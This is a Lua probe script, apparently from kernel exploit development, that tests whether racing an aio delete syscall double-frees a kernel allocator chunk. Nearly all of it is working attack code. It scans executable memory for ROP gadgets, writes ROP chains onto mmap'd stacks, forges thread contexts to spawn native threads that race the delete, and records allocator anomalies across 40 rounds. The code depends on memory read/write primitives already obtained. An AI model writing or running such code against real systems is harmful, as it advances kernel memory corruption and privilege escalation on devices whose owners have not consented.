-- CRASH_CLASS: HIGH
-- PROBE 720a: does the gated delete race damage the kernel allocator?
--
-- Context: probe 719a released two native children onto the same aio delete with
-- one umtx wake and both returned status 0 in all 30 rounds. That alone proves
-- nothing, because 14.10 writes 0 both when the second caller misses the slot
-- (8ad6ffab) and when it finds an already-cleared context C (8ad6fef6).
--
-- The two cases differ in the allocator: an overlap frees C twice, so the 0x30
-- chunk appears on the freelist twice and two later 0x30 allocations can return
-- the same address. This probe therefore follows every racing round with a
-- create/poll/delete cycle and records anything that is not a clean 0/3/0.
--
-- Round structure:
--   create -> poll (needed: state gate) -> two children wait on one umtx word
--   -> one wake releases both onto delete(id) -> both statuses read
--   -> health object created, polled and deleted -> anomaly recorded.

print("=== PROBE 720a: aio delete race, allocator health per round ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

local function spawn(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(stat))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local pout = mmap(page)

local ROUNDS = 40
local both, one, miss = 0, 0, 0
local anomalies, created_fail = 0, 0
for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then created_fail = created_fail + 1 end
    pcall(function() mk(664)(uint64(o), uint64(1), uint64(pout)) end)
    local idpage = mmap(page)
    wd(idpage, rd(o) or 0)
    wd(W, 0)
    local KIDS = 4
    local stats = {}
    local spawned = 0
    for k=1,KIDS do
        stats[k] = mmap(page)
        wd(stats[k], 0x77777777)
        if spawn(idpage, stats[k]) then spawned = spawned + 1 end
    end
    if spawned < KIDS then print(string.format("    round %d spawned %d/%d", r, spawned, KIDS)) end
    sleep_ms(15)
    for i=1,8 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
    sleep_ms(20)
    local a = rd(stats[1]) or 0
    local b = rd(stats[2]) or 0
    local zeros = 0
    for k=1,KIDS do if (rd(stats[k]) or 0) == 0 then zeros = zeros + 1 end end
    if zeros >= 2 then both = both + 1
    elseif zeros == 1 then one = one + 1
    elseif zeros == 0 then miss = miss + 1 end

    -- was the raced object really removed?
    local pa = mmap(page)
    pcall(function() mk(664)(uint64(o), uint64(1), uint64(pa)) end)
    local after = rd(pa) or 0

    -- allocator health: a fresh 0x30 pair must be obtainable and releasable
    local ho = mmap(page)
    local hp = mmap(page)
    local hs = mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(ho)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(ho), uint64(1), uint64(hp)) end)
    wd(hs, 0x77777777)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(ho), uint64(1), uint64(hs)) end)
    local hstate = rd(hp) or 0
    local hstatus = rd(hs) or 0
    if not (ok1 and ok2 and ok3 and to_num(rv1)==0 and to_num(rv2)==0 and to_num(rv3)==0 and hstate==3 and hstatus==0) then
        anomalies = anomalies + 1
        print(string.format("    round %d ANOMALY race=%08X/%08X after=%08X health rv=%s/%s/%s state=%08X status=%08X",
            r, a, b, after, tostring(to_num(rv1)), tostring(to_num(rv2)), tostring(to_num(rv3)), hstate, hstatus))
    end
    if r % 10 == 0 then
        print(string.format("[B] round %d both=%d one=%d miss=%d anomalies=%d alive=%d",
            r, both, one, miss, anomalies, to_num(native.fcall_with_rax(fn_ud, 20))))
    end
end
print(string.format("[C] both=%d one=%d miss=%d anomalies=%d create-fail=%d alive=%d",
    both, one, miss, anomalies, created_fail, to_num(native.fcall_with_rax(fn_ud, 20))))
